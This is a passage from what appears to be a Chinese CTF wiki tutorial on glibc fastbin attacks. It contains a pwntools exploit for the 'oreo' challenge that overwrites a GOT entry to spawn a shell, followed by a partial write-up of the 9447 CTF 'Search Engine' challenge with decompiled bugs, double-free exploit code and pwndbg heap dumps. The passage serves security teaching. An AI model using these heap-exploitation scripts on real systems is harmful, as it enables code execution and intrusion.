<span class="n">oreo</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./oreo&quot;</span><span class="p">)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./oreo&quot;</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;PID: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">descrip</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="c1">#p.recvuntil(&#39;Rifle name: &#39;)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="c1">#p.recvuntil(&#39;Rifle description: &#39;)</span>
    <span class="c1">#sleep(0.5)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">descrip</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">show_rifle</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;===================================</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">order</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">message</span><span class="p">(</span><span class="n">notice</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
    <span class="c1">#p.recvuntil(&quot;Enter any notice you&#39;d like to submit with your order: &quot;)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">notice</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
    <span class="nb">print</span> <span class="s1">&#39;step 1. leak libc base&#39;</span>
    <span class="n">name</span> <span class="o">=</span> <span class="mi">27</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">oreo</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">show_rifle</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;===================================</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
    <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)[:</span><span class="mi">4</span><span class="p">])</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;puts addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
    <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>

    <span class="nb">print</span> <span class="s1">&#39;step 2. free fake chunk at 0x0804A2A8&#39;</span>

    <span class="c1"># now, oifle_cnt=1, we need set it = 0x40</span>
    <span class="n">oifle</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">while</span> <span class="n">oifle</span> <span class="o">&lt;</span> <span class="mh">0x3f</span><span class="p">:</span>
        <span class="c1"># set next link=NULL</span>
        <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
        <span class="n">oifle</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804a2a8</span><span class="p">)</span>
    <span class="c1"># set next link=0x0804A2A8, try to free a fake chunk</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="c1"># before free, we need to bypass some check</span>
    <span class="c1"># fake chunk&#39;s size is 0x40</span>
    <span class="c1"># 0x20 *&#39;a&#39; for padding the last fake chunk</span>
    <span class="c1"># 0x40 for fake chunk&#39;s next chunk&#39;s prev_size</span>
    <span class="c1"># 0x100 for fake chunk&#39;s next chunk&#39;s size</span>
    <span class="c1"># set fake iofle&#39; next to be NULL</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="mh">0x20</span> <span class="o">*</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">52</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">)</span>
    <span class="n">message</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="c1"># fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span>
    <span class="n">order</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Okay order submitted!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="nb">print</span> <span class="s1">&#39;step 3. get shell&#39;</span>
    <span class="c1"># modify free@got to system addr</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">oreo</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;strlen&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">20</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;system addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
    <span class="c1">#gdb.attach(p)</span>
    <span class="n">message</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>
</pre></div>
</div>
<p>当然，该题目也可以使用 <code class="docutils literal"><span class="pre">fast</span> <span class="pre">bin</span> <span class="pre">attack</span></code> 中的其它技术来实现，可参考参考文献中的链接。</p>
</div>
</div>
<div class="section" id="ctf-search-engine">
<h2>2015 9447 CTF : Search Engine<a class="headerlink" href="#ctf-search-engine" title="永久链接至标题">¶</a></h2>
<div class="section" id="id18">
<h3>基本信息<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h3>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2015_9447ctf_search-engine git:(master) file search
search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped
➜  2015_9447ctf_search-engine git:(master) checksec search
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
</pre></div>
</div>
</div>
<div class="section" id="id19">
<h3>基本功能<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h3>
<p>程序的基本功能是</p>
<ul class="simple">
<li>索引一个句子<ul>
<li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li>
<li>读取的字符串长度必须和给定的大小相等</li>
<li>每次索引的句子都是直接在直接建立在前面的句子上的。</li>
</ul>
</li>
<li>在一个句子中搜索单词<ul>
<li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li>
</ul>
</li>
<li>读取指定长度字符串<ul>
<li>如果有回车标记<ul>
<li>在指定长度内没有遇到回车，则读完没有设置NULL标记</li>
<li>在指定长度内遇到回车，就截断返回。</li>
</ul>
</li>
<li>没有回车标记<ul>
<li>读够指定长度，没有NULL标记结尾。</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
<div class="section" id="id20">
<h3>词语结构体<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h3>
<p>通过分析索引句子的过程，我们可以得到词语的结构如下</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)
00000000 content         dq ?
00000008 size            dd ?
0000000C padding1        dd ?
00000010 sentence_ptr    dq ?                    ; offset
00000018 len             dd ?
0000001C padding2        dd ?
00000020 next            dq ?                    ; offset
00000028 word_struct     ends
</pre></div>
</div>
</div>
<div class="section" id="id21">
<h3>堆内存相关操作<a class="headerlink" href="#id21" title="永久链接至标题">¶</a></h3>
<p>分配</p>
<ul class="simple">
<li>malloc 40 字节为一个word结构体</li>
<li>为句子或者单词 malloc 指定大小。</li>
</ul>
<p>释放</p>
<ul class="simple">
<li>释放删除的句子</li>
<li>释放删除句子所搜索的临时单词</li>
<li>释放索引句子时未使用的单词结构</li>
</ul>
</div>
<div class="section" id="id22">
<h3>漏洞<a class="headerlink" href="#id22" title="永久链接至标题">¶</a></h3>
<p><strong>索引句子读取字符串时无NULL结尾</strong></p>
<p>在索引句子时 flag_enter 永远为 0，所以读取句子时最后没有 NULL 结尾。</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">_flag_enter</span> <span class="o">=</span> <span class="n">flag_enter</span><span class="p">;</span>
<span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
<span class="p">{</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="n">v4</span><span class="p">];</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="n">v4</span><span class="p">],</span> <span class="mi">1</span><span class="n">uLL</span><span class="p">,</span> <span class="mi">1</span><span class="n">uLL</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="k">break</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v5</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">_flag_enter</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="o">*</span><span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">v6</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="nb">len</span> <span class="o">&lt;=</span> <span class="n">v6</span> <span class="o">-</span> <span class="mi">1</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">+=</span> <span class="n">v6</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="nb">len</span> <span class="o">&lt;=</span> <span class="n">v4</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
<p><strong>读取选择操作数</strong></p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">read_num</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="o">//</span> <span class="n">rax</span>
  <span class="n">char</span> <span class="o">*</span><span class="n">endptr</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">50</span><span class="n">h</span><span class="p">]</span>
  <span class="n">char</span> <span class="n">nptr</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">48</span><span class="n">h</span><span class="p">]</span>
  <span class="n">unsigned</span> <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">48</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">);</span>
  <span class="n">read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nptr</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">endptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">endptr</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">nptr</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1</span><span class="n">LL</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2"> is not a valid number</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nptr</span><span class="p">);</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>因为 read_str 不设置NULL ，因此，如果 nptr 读取的不合法的话，就有可能会 leak 出栈上的内容。</p>
<p><strong>索引句子释放未置NULL</strong></p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="k">else</span>
<span class="p">{</span>
  <span class="n">free</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
<p><strong>搜索词语中删除词语时，对应句子指针只是释放，并没有设置为NULL</strong></p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span>for ( i = head; i; i = i-&gt;next )
{
  if ( *i-&gt;sentence_ptr )
  {
    if ( LODWORD(i-&gt;size) == v0 &amp;&amp; !memcmp((const void *)i-&gt;content, v1, v0) )
    {
      __printf_chk(1LL, &quot;Found %d: &quot;, LODWORD(i-&gt;len));
      fwrite(i-&gt;sentence_ptr, 1uLL, SLODWORD(i-&gt;len), stdout);
      putchar(&#39;\n&#39;);
      puts(&quot;Delete this sentence (y/n)?&quot;);
      read_str(&amp;choice, 2, 1);
      if ( choice == &#39;y&#39; )
      {
        memset(i-&gt;sentence_ptr, 0, SLODWORD(i-&gt;len));
        free(i-&gt;sentence_ptr);
        puts(&quot;Deleted!&quot;);
      }
    }
  }
}
free(v1);
</pre></div>
</div>
<p>可以看出，在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 <code class="docutils literal"><span class="pre">\x00</span></code> ，由于单词结构体中存储的单词只是句子的一个指针，所以单词也会被置为 <code class="docutils literal"><span class="pre">\x00</span></code>
。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。看起来由于句子内容被置为 <code class="docutils literal"><span class="pre">\x00</span></code> 可以防止通过 <code class="docutils literal"><span class="pre">*i-&gt;sentence_ptr</span></code> 验证。然而，由于 chunk
被释放后会被放到 bin 中，当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。此外，当句子被 <code class="docutils literal"><span class="pre">memset</span></code> 的时候，单词虽然都变为了 <code class="docutils literal"><span class="pre">\x00</span></code>
，但是我们仍然可以通过两个 <code class="docutils literal"><span class="pre">\x00</span></code> 的比较来绕过 <code class="docutils literal"><span class="pre">memcmp</span></code> 的检测。</p>
</div>
<div class="section" id="id23">
<h3>利用<a class="headerlink" href="#id23" title="永久链接至标题">¶</a></h3>
<div class="section" id="id24">
<h4>利用思路<a class="headerlink" href="#id24" title="永久链接至标题">¶</a></h4>
<p>基本利用思路如下</p>
<ul class="simple">
<li>利用 unsorted bin 地址泄漏 libc 基地址</li>
<li>利用 double free 构造 fastbin 循环链表</li>
<li>分配 chunk 到 malloc_hook 附近，修改malloc_hook 为 one_gadget</li>
</ul>
</div>
<div class="section" id="libc">
<h4>泄漏 libc 地址<a class="headerlink" href="#libc" title="永久链接至标题">¶</a></h4>
<p>这里我们分配一个 small bin 大小的 chunk ，当它被释放后，就会放入到 unsorted bin 中。因而，只要 <code class="docutils literal"><span class="pre">unsorted</span> <span class="pre">bin</span></code> 的地址的起始字节不是 <code class="docutils literal"><span class="pre">\x00</span></code> 便可以通过验证。同时，我们可以构造 <code class="docutils literal"><span class="pre">\x00</span></code>
来进行比较，从而通过验证。具体如下</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">leak_libc</span><span class="p">():</span>
    <span class="n">smallbin_sentence</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span> <span class="o">*</span> <span class="mh">0x85</span> <span class="o">+</span> <span class="s1">&#39; m &#39;</span>
    <span class="n">index_sentence</span><span class="p">(</span><span class="n">smallbin_sentence</span><span class="p">)</span>
    <span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
    <span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Found &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">smallbin_sentence</span><span class="p">))</span> <span class="o">+</span> <span class="s1">&#39;: &#39;</span><span class="p">)</span>
    <span class="n">unsortedbin_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">unsortedbin_addr</span>
</pre></div>
</div>
</div>
<div class="section" id="fastbin">
<h4>构造 fastbin 循环链表<a class="headerlink" href="#fastbin" title="永久链接至标题">¶</a></h4>
<p>由于我们最后希望在 malloc_hook 处分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是0x7f。即，我们所需要设置的设置的 fast bin 的数据字节部分的大小为 0x60。这里我们按照如下方式构造</p>
<ol class="arabic simple">
<li>分别索引句子a，索引句子b，索引句子c，则此时单词链表中索引的句子的相对顺序为c-&gt;b-&gt;a。假设句子 a 为’a’ * 0x5d+‘d’，句子 b 为 ‘b’ * 0x5d+‘d’，句子c类似。</li>
<li>索引单词d，三个均删除，则此时 fastbin 中的链表情况为 a-&gt;b-&gt;c-&gt;NULL，这是因为首先释放的是句子c，最后释放的是句子 a 。这时，搜索单词时<code class="docutils literal"><span class="pre">*i-&gt;sentence_ptr</span></code> 对于a, b 来说都是可以绕过的。</li>
<li>我们此时再次删除搜索单词 <code class="docutils literal"><span class="pre">\x00</span></code>。首先遍历的是 c，但是 c 的验证不通过；其次遍历的是b，验证通过，我们将其释放；其次遍历的是a，验证通过，但是我们不删除。则此时 fastbin 的情况为
b-&gt;a-&gt;b-&gt;a-&gt;…。即已经构成了double free b的情况。由于我们先前为了 leak libc 还建立一个句子，所以还有一个单词可以比较，这里我们也不删除。</li>
</ol>
<p>具体代码如下</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># 2. create cycle fastbin 0x70 size</span>
<span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x5d</span> <span class="o">+</span> <span class="s1">&#39; d &#39;</span><span class="p">)</span>  <span class="c1">#a</span>
<span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mh">0x5d</span> <span class="o">+</span> <span class="s1">&#39; d &#39;</span><span class="p">)</span>  <span class="c1">#b</span>
<span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mh">0x5d</span> <span class="o">+</span> <span class="s1">&#39; d &#39;</span><span class="p">)</span>  <span class="c1">#c</span>

<span class="c1"># a-&gt;b-&gt;c-&gt;NULL</span>
<span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>

<span class="c1"># b-&gt;a-&gt;b-&gt;a-&gt;...</span>
<span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>效果如下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>pwndbg&gt; fastbins
fastbins
0x20: 0x0
0x30: 0x1d19320 ◂— 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x1d191b0 —▸ 0x1d19010 —▸ 0x1d191b0 ◂— 0x1d19010
0x80: 0x0
</pre></div>
</div>
</div>
<div class="section" id="malloc-hook-chunk">
<h4>分配 malloc_hook 附近chunk<a class="headerlink" href="#malloc-hook-chunk" title="永久链接至标题">¶</a></h4>
<p>此时，fastbin 的链表为 b-&gt;a-&gt;b-&gt;a-&gt;…，则我们可以在申请第一个相同大小的 chunk 时，设置 b 的 fd 为 malloc_hook 附近处的 chunk <code class="docutils literal"><span class="pre">0x7fd798586aed</span></code>（这里是举一个例子，代码中需使用相对地址）。</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>pwndbg&gt; print (void*)&amp;main_arena
$1 = (void *) 0x7fd798586b20 &lt;main_arena&gt;
pwndbg&gt; x/8gx 0x7fd798586b20-16
0x7fd798586b10 &lt;__malloc_hook&gt;: 0x0000000000000000  0x0000000000000000
0x7fd798586b20 &lt;main_arena&gt;:    0x0000000000000000  0x0000000000bce130
0x7fd798586b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000
0x7fd798586b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000
pwndbg&gt; find_fake_fast 0x7fd798586b10 0x7f
FAKE CHUNKS
0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA {
  prev_size = 15535264025435701248,
  size = 127,
  fd = 0xd798247e20000000,
  bk = 0xd798247a0000007f,
  fd_nextsize = 0x7f,
  bk_nextsize = 0x0
}
pwndbg&gt; print /x 0x7fd798586b10-0x7fd798586aed
$2 = 0x23
pwndbg&gt; print /x 0x7fd798586b20-0x7fd798586aed
$3 = 0x33
</pre></div>
</div>
